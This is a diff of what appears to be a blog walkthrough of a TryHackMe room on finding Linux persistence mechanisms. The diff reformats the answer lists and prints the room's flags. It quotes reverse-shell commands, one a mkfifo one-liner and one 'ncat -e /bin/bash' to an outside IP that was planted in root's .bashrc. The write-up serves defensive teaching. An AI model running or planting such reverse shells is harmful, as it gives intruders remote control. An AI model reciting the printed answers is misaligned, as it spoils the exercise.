@@ -212,9 +212,16 @@ A. /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1
 <p>It also helps the investigator remember the mindset that they had during the course of the investigation. The importance of taking note of one’s mindset during different points of an investigation is usually given less importance in favour of focusing on the more exciting atomic indicators; however, recording it provides further context on why a specific bit is recorded in the first place. This is how pivot points are decided and further leads, born and pursued.</p>
 <p>The advantages of a dirty wordlist don’t end here. A quick way to formally document findings at the end of the investigation is to clean them up. It is recommended to put in every sort of detail that may help during the course of the investigation. So, in the end, it would be easy to remove all the unneeded details and false leads, enrich actual IOCs, and establish points of emphasis. The flag for this task is: THM{d1rty_w0rdl1st}</p>
 <h2 id="answer-the-questions-below-">Answer the questions below :</h2>
-<ol>
-<li>This section is a bonus discussion on the importance of a dirty wordlist. Accept the extra point and happy hunting!<br>What is the flag?<br>A. THM{d1rty_w0rdl1st}</li>
-</ol>
+          
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">          
+<code><span class="ve"> </span><span class="p">
+1. This section is a bonus discussion on the importance of a dirty wordlist. Accept the extra point and happy hunting!
+   What is the flag?
+A. THM{d1rty_w0rdl1st}
+  </span>
+</code></pre></div></div><br>         
+          
+
 <h1 id="task-4-investigating-the-root-account">Task 4 : Investigating the root account</h1>
 <p>Normal user accounts aren’t the only place to leave persistence mechanisms. As such, we will then go ahead and investigate the root account.</p>
 <p>A few moments after logging on to the root account, we find an error message in our terminal which is given below.</p>
@@ -222,22 +229,43 @@ A. /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1
 <p><strong>ncat -e /bin/bash 172.10.6.9 6969.</strong></p>
 <p><img src="https://miro.medium.com/v2/resize:fit:661/1*ynVkJC4CG53PhSpFho9QwQ.png" alt=""></p>
 <h2 id="answer-the-questions-below-">Answer the questions below :</h2>
-<ol>
-<li><p>A few moments after logging on to the root account, you find an error message in your terminal.<br>What does it say?<br>A. Ncat: TIMEOUT  </p>
-</li>
-<li><p>After moving forward with the error message, a suspicious command appears in the terminal as part of the error message.<br>What command was displayed?<br>A. ncat -e /bin/bash 172.10.6.9 6969  </p>
-</li>
-<li><p>You might wonder, &quot;how did that happen? I didn&#39;t even do anything? I just logged as root, and it happened.&quot;<br>Can you find out how the suspicious command has been implemented?<br>A. .bashrc</p>
-</li>
-</ol>
+          
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">          
+<code><span class="ve"> </span><span class="p">
+1. A few moments after logging on to the root account, you find an error message in your terminal.
+   What does it say?
+A. Ncat: TIMEOUT
+
+2. After moving forward with the error message, a suspicious command appears in the terminal as part of the error message.
+   What command was displayed?
+A. ncat -e /bin/bash 172.10.6.9 6969
+
+3. You might wonder, "how did that happen? I didn't even do anything? I just logged as root, and it happened."
+   Can you find out how the suspicious command has been implemented?
+A. .bashrc
+  </span>
+</code></pre></div></div><br>           
+          
+          
+
 <h1 id="task-5-investigating-the-system">Task 5 : Investigating the system</h1>
 <p>After checking the giorgio and the root accounts, it’s essentially a free-for-all from here on, as finding more suspicious items depends on how well you know what’s “normal” in the system.</p>
 <p>wecan find the last persistence mechanism by reading  <strong>/etc/passwd.</strong></p>
 <p><img src="https://miro.medium.com/v2/resize:fit:700/1*XicWIf5G-vhlNjImU3SCDw.png" alt=""></p>
 <h2 id="answer-the-questions-below-">Answer the questions below :</h2>
-<ol>
-<li>There&#39;s one more persistence mechanism in the system.<br>A good way to systematically dissect the system is to look for &quot;usuals&quot; and &quot;unusuals&quot;. For example, you can check for commonly abused or unusual files and directories.<br>This specific persistence mechanism is directly tied to something (or someone?) already present in fresh Linux installs and may be abused and/or manipulated to fit an adversary&#39;s goals. What&#39;s its name?<br>What is the last persistence mechanism?<br>A. nobody</li>
-</ol>
+          
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">          
+<code><span class="ve"> </span><span class="p">
+1. There's one more persistence mechanism in the system.
+   A good way to systematically dissect the system is to look for "usuals" and "unusuals". For example, you can check for commonly abused or unusual files and directories.
+   This specific persistence mechanism is directly tied to something (or someone?) already present in fresh Linux installs and may be abused and/or manipulated to fit an adversary's goals. What's its name?
+   What is the last persistence mechanism?
+A. nobody
+  </span>
+</code></pre></div></div><br>           
+                    
+          
+          
 <h1 id="task-6-final-thoughts">Task 6 : Final Thoughts</h1>
 <p>Now that you’ve found the final persistence mechanism, it’s time to clean up. The persistence mechanisms tackled in this room are common and straightforward; as such, the process of eradicating them is simple.</p>
 <p>The first four persistence mechanisms can be remediated by simply removing the mechanism (e.g. delete the file, remove the commands). The last one, however, involves bringing back the “unusuals” to their “usual” state, which is a bit more complex as you intend for that particular user, file or process to function as before.</p>
@@ -247,9 +275,16 @@ A. /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1
 <p>in the terminal to get the flag.</p>
 <p><img src="https://miro.medium.com/v2/resize:fit:599/1*TFkzpJp2AkfT1XGl89s_xw.png" alt=""></p>
 <h2 id="answer-the-questions-below-">Answer the questions below :</h2>
-<ol>
-<li>Finally, as you&#39;ve already found the final persistence mechanism, there&#39;s value in going all the way through to the end.<br>The adversary left a golden nugget of &quot;advise&quot; somewhere.<br>What is the nugget?<br>A. THM{Nob0dy_1s_s@f3}  </li>
-</ol>
+          
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">          
+<code><span class="ve"> </span><span class="p">
+1. Finally, as you've already found the final persistence mechanism, there's value in going all the way through to the end.
+   The adversary left a golden nugget of "advise" somewhere.
+   What is the nugget?
+A. THM{Nob0dy_1s_s@f3}
+  </span>
+</code></pre></div></div><br>             
+          
 <p><strong>Thankyou For Reading.</strong></p>
 
 
